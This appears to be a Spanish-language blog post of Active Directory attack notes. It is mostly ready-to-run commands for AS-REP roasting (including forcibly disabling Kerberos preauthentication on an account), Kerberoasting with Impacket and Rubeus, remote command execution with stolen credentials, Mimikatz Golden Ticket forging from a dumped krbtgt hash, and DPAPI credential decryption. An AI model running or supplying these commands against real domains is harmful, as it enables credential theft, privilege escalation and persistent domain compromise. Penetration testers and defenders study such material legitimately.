---
title: Active Directory
description: "Apuntes de Active Directory"
last_modified_at: false
date: 2026-01-11 06:22:59 -500
categories: [Active Directory]
tags: [Cyberseguridad, Windows]
home_image: banner
banner:
  path: /assets/posts/active-directory.png
  alt: "Active Directory"
---

## ASREPRast

Si una cuenta de usuario de dominio no requiere autenticación previa de Kerberos, podemos solicitar un TGT válido para esta cuenta sin siquiera tener credenciales de dominio, extraer el
blob cifrado y ejecutarlo por fuerza bruta sin conexión.

- PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
- AD Module: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`

Desactivar forzosamente la preautorización de Kerberos en una cuenta con permisos de escritura o superiores. Consultar permisos interesantes en las cuentas:

Sugerencia: agregamos un filtro, por ejemplo, RDPUsers, para obtener "Cuentas de usuario", no Cuentas de máquina, ¡porque los hashes de Cuentas de máquina no se pueden descifrar!

- PowerView:

```shell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
Disable Kerberos Preauth:
Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
Check if the value changed:
Get-DomainUser -PreauthNotRequired -Verbose
```
Y finalmente ejecutar el ataque utilizando la herramienta ASREPRoast.

```shell
#Get a specific Accounts hash:
Get-ASREPHash -UserName <UserName> -Verbose

#Get any ASREPRoastable Users hashes:
Invoke-ASREPRoast -Verbose
```

- Usando Rubeus:

```shell
#Trying the attack for all domain users
Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

#ASREPRoast specific user
Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

#ASREPRoast users of a specific OU (Organization Unit)
Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
```


- Usando Impacket:

```shell
#Trying the attack for the specified users on the file
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
```
## Kerberoasting

Todos los usuarios estándar del dominio pueden solicitar una copia de todas las cuentas de servicio junto con sus hashes de contraseña correspondientes.

Por lo tanto, podemos solicitar un TGS para cualquier SPN que esté asociado a una cuenta de usuario, extraer el blob cifrado (que fue cifrado usando la contraseña del usuario) y luego realizar un ataque de fuerza bruta contra él de forma offline.

```shell
python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
```

## Movimiento lateral

### Remote Code Execution with PS Credentials

```shell
$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
```

## Domain Persistence

### Golden ticket attack
```shell
#Execute mimikatz on DC as DA to grab krbtgt hash:
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>

#On any machine:
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:
<HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

### DCsync Attack


## List and Decrypt Stored Credentials using Mimikatz

Generalmente las credenciales cifradas se almacenan en:

- %appdata%\Microsoft\Credentials
- %localappdata%\Microsoft\Credentials

```shell
#By using the cred function of mimikatz we can enumerate the cred object and get information about it:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"

#From the previous command we are interested to the "guidMasterKey" parameter, that tells us which masterkey was used to encrypt the credential
#Lets enumerate the Master Key:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>"

#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>" /rpc

#We now have the masterkey in our local cache:
dpapi::cache

#Finally we can decrypt the credential using the cached masterkey:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
```